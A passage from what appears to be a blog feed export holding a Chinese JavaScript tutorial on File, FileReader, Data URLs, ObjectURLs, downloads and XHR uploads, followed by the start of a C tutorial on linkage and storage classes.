comment">&lt;!--        如果要上传多个文件，则使用：        &lt;input type="file" class="upload" multiple />        --></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Upload<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">doUpload</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/></span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">            <span class="token keyword">var</span> upload <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment">// 用户点击 Upload 按钮后执行</span>            <span class="token keyword">function</span> <span class="token function">doUpload</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">var</span> file <span class="token operator">=</span> upload<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                                console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// File &#123;name: "test.txt", lastModified: 1583634142542, lastModifiedDate: </span>                <span class="token comment">// Sun Mar 08 2020 10:22:22 GMT+0800 (中国标准时间), webkitRelativePath: "", size: 12, …&#125;</span>            <span class="token punctuation">&#125;</span>                        <span class="token comment">// 也可以用这种方法获取文件对象，</span>            <span class="token comment">// 这个函数中的代码会在用户完成上传操作就执行，即使没点上传按钮</span>            upload<span class="token punctuation">.</span><span class="token function-variable function">onchange</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">el</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">var</span> file <span class="token operator">=</span> el<span class="token punctuation">.</span>files<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token comment">// 执行的操作...</span>            <span class="token punctuation">&#125;</span>        </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="FileReader"><a href="#FileReader" class="headerlink" title="FileReader"></a>FileReader</h2><p><code>FileReader</code> 是另一个用于读取文件数据的接口，其实例化后的一些方法与 <code>Blob</code> 中的 <code>.text()</code> 和 <code>.arrayBuffer</code> 方法类似，只不过返回的不再是一个 promise 对象，而是一个基于 <strong>事件</strong> 的接口；<code>FileReader</code> 一般也用于读取用户上传文件的数据；</p><p>语法：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 实例化无须提供任何参数</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="事件处理"><a href="#事件处理" class="headerlink" title="事件处理"></a>事件处理</h3><p>既然是以基于事件，那么就需要一系列处理不同事件的方法，列出如下：</p><ul><li><code>.onabort()</code>：该事件在读取操作被中断时触发。</li><li><code>.onerror()</code>：该事件在读取操作发生错误时触发。</li><li><code>.onload()</code>：该事件在读取操作完成时触发。</li><li><code>.onloadstart()</code>：该事件在读取操作开始时触发。</li><li><code>.onloadend()</code>：该事件在读取操作结束时（要么成功，要么失败）触发。</li><li><code>.onprogress()</code>：该事件在读取Blob时触发。</li></ul><p>以上事件也可以使用 <code>addEventListener()</code> 方法的相应格式来设置回调函数；</p><h3 id="加载状态"><a href="#加载状态" class="headerlink" title="加载状态"></a>加载状态</h3><p>因为是基于事件的接口，所以 <code>FileReader</code> 提供了 <code>readyState</code> 这个属性，以不同值代表不同的数据加载状态：</p><ul><li><strong>0</strong>：数据尚未加载；</li><li><strong>1</strong>：数据正在加载中；</li><li><strong>2</strong>：数据加载完成；</li></ul><p>数据加载完成后，可以使用 <code>result</code> 这个属性来获取文件内容；</p><h3 id="数据加载"><a href="#数据加载" class="headerlink" title="数据加载"></a>数据加载</h3><h4 id="readAsText"><a href="#readAsText" class="headerlink" title="readAsText()"></a>readAsText()</h4><p><code>.readAsText(file[, encoding])</code> 以文本字符串的形式读取 <code>file</code> （文件对象或者 Blob）中的数据，以 <code>encoding</code> 格式进行编码（默认 utf-8）；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'abc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'test.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>reader<span class="token punctuation">.</span><span class="token function-variable function">onloadstart</span> <span class="token operator">=</span> <span class="token parameter">event</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'loadstart state:'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>readyState<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>reader<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token parameter">event</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'load state:'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>readyState<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'result:'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>reader<span class="token punctuation">.</span><span class="token function-variable function">onloadend</span> <span class="token operator">=</span> <span class="token parameter">event</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'loadend state:'</span><span class="token punctuation">,</span> event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>readyState<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>reader<span class="token punctuation">.</span><span class="token function">readAsText</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// loadstart state: 1</span><span class="token comment">// load state: 2</span><span class="token comment">// result: abc</span><span class="token comment">// loadend state: 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="readAsArrayBuffer"><a href="#readAsArrayBuffer" class="headerlink" title="readAsArrayBuffer()"></a>readAsArrayBuffer()</h4><p><code>readAsArrayBuffer(file)</code> 以 <code>ArrayBuffer</code> 的形式读取 <code>file</code> 中（文件或 Blob）的数据；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 使用监听器触发效果相同</span>reader<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'load'</span><span class="token punctuation">,</span> <span class="token parameter">event</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>reader<span class="token punctuation">.</span><span class="token function">readAsArrayBuffer</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ArrayBuffer(3) &#123;&#125;</span><span class="token comment">// Uint8Array(3) [97, 98, 99]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="readAsDataURL"><a href="#readAsDataURL" class="headerlink" title="readAsDataURL()"></a>readAsDataURL()</h4><p><code>readAsDataURL(file)</code> 同样是读取 <code>file</code> 中的数据，只是将文件中的内容以 <strong>base64</strong> 编码后，放进一个 <code>DataURL</code> 中（内容可以通过 URL 链接直接访问）；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'abc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'test.txt'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'text/plain'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">var</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>reader<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token parameter">event</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>reader<span class="token punctuation">.</span><span class="token function">readAsDataURL</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// data:text/plain;base64,YWJj</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果将最后的输出内容粘贴复制进浏览器的地址栏，回车后就能直接看见文本内容；</p><h2 id="呈现数据"><a href="#呈现数据" class="headerlink" title="呈现数据"></a>呈现数据</h2><h3 id="DataURL"><a href="#DataURL" class="headerlink" title="DataURL"></a>DataURL</h3><p><strong>Data URL</strong> 指的是一种 <code>URL</code> 协议，语法格式为：</p><pre class="line-numbers language-none"><code class="language-none">data:[&lt;mediatype&gt;][;base64],&lt;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以类比常见的 <code>http:</code> 协议，例如上例中的返回值：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">data:text/plain<span class="token punctuation">;</span>base64,YWJj<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>具体用法如之前所述，输入到浏览器地址栏回车后会直接呈现出原内容，比如上例就是一串文本（文件类型被指定为 <code>text/plain</code>），如果类型 <code>image/png</code> 等图片格式的，则会直接显示该图片；</p><p>Data URL 除了可以通过浏览器地址栏访问，也可以在 HTML 文档中展示，例如使 <code>&lt;img&gt;</code> 的 <code>src</code> 属性值等于这个 Data URL，这个标签就会展示为相应的图片，同样地，数据指定给 <code>&lt;iframe&gt;</code> 的 <code>src</code> 属性，也可以展示图片或者文本数据，指定给 <code>&lt;video&gt;</code> 标签的 <code>src</code> 则可以展示视频；</p><h3 id="ObjectURL"><a href="#ObjectURL" class="headerlink" title="ObjectURL"></a>ObjectURL</h3><p><strong>ObjectURL</strong> 使用 <code>URL.createObjectURL()</code> 方法创建，返回结果也是一种类型的 URL，类似于上面的 Data URL，区别在于 ObjectURL 的生命周期与当前网站页面相关，例如 <strong>刷新页面</strong> 页面后不无法继续访问了；</p><p>例如在本地网页控制台中运行下面的代码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> blob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'abc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>则会输出类似下面的内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">blob:http://127.0.0.1:8080/4064e759-231f-466e-a6ef-778505e56d2b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>链接临时有效，会展示数据内容刷新页面失效，不过格式基本一致；同样，ObjectURL 也可以用于设置为 <code>&lt;img&gt;</code> 或 <code>&lt;iframe&gt;</code> 的 <code>src</code> 属性，进行单独展示；</p><p>需要 <strong>注意</strong>，<code>createObjectURL()</code> 方法每次调用都会返回一个新的 ObjectURL 对象，即使数据源相同，所以如果调用量较多，可能就会内存剧增，这时需要手动回收，使用的是 <code>revokeObjectURL()</code> 这个方法，示例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> url <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">revokeObjectURL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 完成回收</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><p>除了使用 <code>&lt;img</code>, <code>&lt;iframe&gt;</code> 等标签对数据进行展示，也可以将文件提供给用户下载，使用的是 <code>&lt;a&gt;</code> 标签，把 DataURL 或者 ObjectURL 指定给它的 <code>href</code> 属性即可，另外还要指定 <code>download</code> 属性值，不然有可能会是跳转到相关页面而不是下载；</p><p>一个下载组件的示例：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:text/plain;base64,YWJj<span class="token punctuation">"</span></span> <span class="token attr-name">download</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.txt<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/plain<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Download<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>download</code> 属性指代下载到用户本地的文件名称，不加后缀则系统自动识别类型，同样 <code>type</code> 属性也是可选的，可用于固定下载文件类型；</p><h2 id="上传数据"><a href="#上传数据" class="headerlink" title="上传数据"></a>上传数据</h2><p>让用户通过网页上传文件，最重要的当然就是最后的上传阶段了，即把用户选择的文件上传到服务器；下面的例子使用 <code>XMLHttpRequest()</code> 接口来实现数据的上传；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'hello world!'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'hello.txt'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'text/plain'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 此处用于模拟用户上传的文件，即有具体的文件名、类型和内容</span><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileReader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 查看上传进度</span>xhr<span class="token punctuation">.</span>upload<span class="token punctuation">.</span><span class="token function-variable function">onprogress</span> <span class="token operator">=</span> <span class="token parameter">event</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span>lengthComputable<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'进度：'</span>， event<span class="token punctuation">.</span>loaded <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> event<span class="token punctuation">.</span>total<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 上传完成的回调</span>xhr<span class="token punctuation">.</span>upload<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token parameter">event</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'upload success.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 上传地址，参数换成实际地址</span>xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">'http://localhost/upload/upload.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 服务器没有指定文件类型则自行指定</span>xhr<span class="token punctuation">.</span><span class="token function">overrideMimeType</span><span class="token punctuation">(</span><span class="token string">'text/plain'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>reader<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token parameter">event</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 数据读取完毕就开始上传</span>    xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>target<span class="token punctuation">.</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>reader<span class="token punctuation">.</span><span class="token function">readAsText</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另外也可以使用 form 表格来上传文件，更加直接：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload/upload.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Upload<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>需要 <strong>注意</strong> 的是，上传文件时 <strong>必须</strong> 加上 <code>enctype=&quot;multipart/form-data&quot;</code>，不然上传上去的只是一个文件名；</p><h2 id="接收数据"><a href="#接收数据" class="headerlink" title="接收数据"></a>接收数据</h2><p>投我以木瓜，报之以琼琚；有时也会接收来着服务端的数据，通常就是使用 <code>XMLHttpRequest</code> 来异步获取文本或 JSON 数据，但是它也能用于获取其他类型的数据，只不过需要手动设置 <code>responseType</code> 这个属性进行申明，该属性支持以下几个值：</p><ul><li><code>&quot;&quot;</code>：默认值，与 text 类型相同；</li><li><code>&quot;text&quot;</code>：以文本类型响应；</li><li><code>&quot;arraybuffer&quot;</code>：以 <code>ArrayBuffer</code> 二进制数据响应；</li><li><code>&quot;blob&quot;</code>：以 <code>Blob</code> 类型数据响应；</li><li><code>&quot;json&quot;</code>：响应解析为 JSON 对象；</li><li><code>&quot;document&quot;</code>：解析为 HTML 或 XML 内容；</li></ul><p>一个接收数据的实例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span>responseType <span class="token operator">=</span> <span class="token string">'arraybuffer'</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> buffer <span class="token operator">=</span> xhr<span class="token punctuation">.</span>response<span class="token punctuation">;</span>    <span class="token comment">// 可以转换为类型化数组进行数据修改</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'test.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>至此，历经几番交战，刀光剑影，战况激烈空前，难分难解，不下几十回合，能阅读至此处的诸位也都是真正的勇士，敢于面对惨淡的生活，正视淋漓的鲜血……又扯远了，俗话说，物以稀为贵，人以和为贵，JavaScript 剑客与二进制隐士此番交战，不求胜负，若这过程中的原理能被大家理解参透得透彻，也算是名留青史了；</p><p>恩怨自了结，情仇终消散，天下没有不散的宴席，暂且就此别过，江湖再见！</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TypedArray Arraybuffer 缓冲区 类型数组 endian 字节序 视图 DataView blob file 上传 下载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C 语言之变量存储类型与链接属性</title>
      <link href="/2024/09/27/c-yu-yan/c-yu-yan-zhi-bian-liang-cun-chu-lei-xing-yu-lian-jie-shu-xing/"/>
      <url>/2024/09/27/c-yu-yan/c-yu-yan-zhi-bian-liang-cun-chu-lei-xing-yu-lian-jie-shu-xing/</url>
      
        <content type="html"><![CDATA[<p>C语言中一个重要的东西就是弄清申明变量的类型、作用域、存储类型、链接属性等，例如是整型还是浮点型，存储于普通内存还是堆栈或者寄存器，作用于全局还是局部，能否被其他文件 引用等。</p><h1 id="链接属性"><a href="#链接属性" class="headerlink" title="链接属性"></a>链接属性</h1><p>申明变量或函数时需要<strong>标识符</strong>，标识符的链接属性一共有三种：<code>external(外部)</code>, <code>internal(内部)</code>, <code>none(无)</code>，external和internal常用，<strong>none</strong>表示无链接属性，该标识符的多个申明被当成独立不同的实体。</p><p>顾名思义，<strong>external</strong>表示能被其它源文件访问的变量或函数，<strong>internal</strong>则不能被其它源文件访问，并且<strong>缺省</strong>情况下<strong>代码块(block)外部</strong>的变量为<strong>external</strong>属性，也就是外部变量，<strong>代码块内部</strong>的变量为<strong>internal</strong>属性，即局部变量.</p><p>如果需要改变链接属性需要使用 <code>extern</code> 和 <code>static</code> 关键字，<code>extern</code> 是转化为<strong>external</strong>属性，<code>static</code> 是转化为<strong>internal</strong>属性。<br>举例说明：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>              <span class="token comment">/* 这里是代码块外部，external 属性，缺省为"extern" */</span><span class="token keyword">extern</span> <span class="token keyword">int</span> aa <span class="token operator">=</span> <span class="token number">11</span><span class="token punctuation">;</span>     <span class="token comment">/* 与上面效果一样 */</span><span class="token keyword">static</span> <span class="token keyword">int</span> aaa <span class="token operator">=</span> <span class="token number">111</span><span class="token punctuation">;</span>   <span class="token comment">/* 这里申明的是 internal 属性，不能被其它源文件访问 */</span><span class="token keyword">void</span> <span class="token function">example</span><span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token comment">/* 这里申明的 example() 函数也是external属性，能被其它源文件访问 */</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>          <span class="token comment">/* 这里是代码块内部，internal 属性 */</span><span class="token keyword">extern</span> <span class="token keyword">int</span> bb <span class="token operator">=</span> <span class="token number">22</span><span class="token punctuation">;</span> <span class="token comment">/* 这里的意思是访问其它源文件的全局变量 */</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>注意上面指出的代码块内部和外部，定义的函数的花括号之外叫做代码块外部，之内叫做代码块内部。</strong><br><strong>代码块外部缺省为<code>extern</code>，并且代码块外部使用<code>extern</code>表示被其它源文件访问，代码块内部使用<code>extern</code>表示访问其它文件的外部变量。</strong></p></blockquote><h1 id="存储类型"><a href="#存储类型" class="headerlink" title="存储类型"></a>存储类型</h1><p>存储类型指申明的变量将被存储到什么地方去，并且与其存储周期有关，就是这个变量何时被创建，何时被销毁，保持多久。</p><p>存储类型有三种：<br>静态变量(<code>static</code>) —&gt; 存储于普通内存。<br>自动变量(<code>auto</code>)   —&gt; 存储于堆栈。<br>寄存器变量(<code>register</code>) —&gt; 存储于寄存器。</p><h6 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h6><p>任何代码块之外定义的变量，总是处于静态内存中，无需使用 <code>static</code> 关键字，在程序运行<strong>之前</strong>创建，程序整个执行期间<strong>始终存在</strong>。</p><h6 